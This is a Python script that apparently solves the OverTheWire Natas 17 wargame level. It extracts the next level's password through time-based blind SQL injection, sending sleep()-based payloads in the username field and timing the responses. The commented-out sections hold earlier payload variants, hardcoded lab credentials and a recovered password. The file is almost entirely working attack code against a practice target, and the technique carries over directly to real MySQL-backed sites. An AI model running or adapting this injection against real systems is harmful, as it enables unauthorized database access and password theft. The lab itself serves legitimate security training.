import requests
from requests.auth import HTTPBasicAuth

import string
import time
import base64

DELTA = 5

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "http://natas17.natas.labs.overthewire.org"
data ={'username':""}
params = {'debug':''}

auth_username = "natas17"
auth_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
headers = {"authorization":'Basic {0}'.format(base64.b64encode((auth_username+':'+auth_password).encode('utf8')).decode())}
password = ""

i = 1
# 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
while len(password) < 32:
    for c in string.digits + string.ascii_letters:
        payload = f"natas18\"&&IF(password like binary '{password+c}%',sleep({DELTA}),1)--\t"
        # print(c + " : " + payload)
        data['username'] = payload  
        before = time.time()
        response = requests.post(URL,params=params,data=data, headers=headers)
        after = time.time()
        if(after-before)> DELTA:
            password += c
            print("password: " + password.ljust(32, '*'))
            i += 1
            break

print("final:" +password)
# password = ""
# i = len(password)+1
# filterd_list = ''
# for c in string.ascii_letters + string.digits:
#     payload = f"\"||IF(password like binary '%{c}%',sleep(8),0)--\t"
    
#     print(payload)
#     data['username'] = payload  
#     before = time.time()
#     response = requests.post(URL,params=params,data=data, headers=headers)
#     # print(response.text)
#     after = time.time()
#     # print('difference: {0}'.format(after-before))
#     if after-before > 8:
#         filterd_list+=c
#         print(filterd_list)
# print(filterd_list)    

# while len(password)!=32:
#     for c in filterd_list:
#         payload = f"\"||IF(password like binary '{password+c}%',sleep(8),0)--\t"
#         print(payload)
#         data['username'] = payload  
#         before = time.time()
#         response = requests.post(URL,params=params,data=data, headers=headers)
#         # print(response.text)
#         after = time.time()
#         # print('difference: {0}'.format(after-before))
#         if after-before > 8:
#             password += c
#             continue
#         if c in string.ascii_letters:
#             payload = f"\"||IF(password like binary '{password+c.upper()}%'),sleep(8),0)--\t"
#             print(payload)
#             data['username'] = payload  
#             before = time.time()
#             response = requests.post(URL,params=params,data=data, headers=headers)
#             # print(response.text)
#             after = time.time()
#             # print('difference: {0}'.format(after-before))
#         if after-before > 8:
#             password += c
#             continue     
#     print(password)
#     i+=1

# print("final:" +password)
# auth_username = "natas17"
# auth_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
# headers = {"authorization":'Basic {0}'.format(base64.b64encode((auth_username+':'+auth_password).encode('utf8')).decode())}
# almost_password= "meydu6mbjewqcokg0kd4lrssuztfxoq"    
# password = "Meydu6mbjewqcokg0kd4lrssuztfxoq"
# i = len(password)+1
# for c in 'b'+string.ascii_letters+string.digits:
#     # payload = f"\"||IF(ascii(substr(password,{i},1))=(ascii('{password+c}')),sleep(8),0)--\t"
#     payload = f"\"||IF(ascii(password)=(ascii('{password+c}')),sleep(8),0)--\t"

#     print(payload)
#     data['username'] = payload
#     before = time.time()
#     response = requests.post(URL,params=params,data=data, headers=headers)
#     # print(response.text)
#     after = time.time()
#     # print('difference: {0}'.format(after-before))
#     if after-before > 8:
#         password += c
#         break

# print("final:" +password)
